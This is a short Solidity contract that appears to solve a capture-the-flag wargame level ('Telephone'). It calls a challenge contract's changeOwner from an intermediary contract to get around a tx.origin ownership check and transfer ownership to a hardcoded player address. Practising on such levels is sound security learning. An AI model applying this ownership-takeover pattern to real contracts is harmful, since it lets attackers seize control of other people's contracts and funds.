pragma solidity ^0.8.7;

interface ChallengeContract {
    function changeOwner(address _owner) external;
}

contract Telephone2 {
    ChallengeContract public challengeContract = ChallengeContract(0xf80eAdA3DBd5bC89855D7147cEb90bB08f59C4e2);

    function solveChallenge() public {
        address playerAddress = 0x940BCF526Ee4F346771b9dA31aa6736eb8B822a5;
        challengeContract.changeOwner(playerAddress);
    }
}
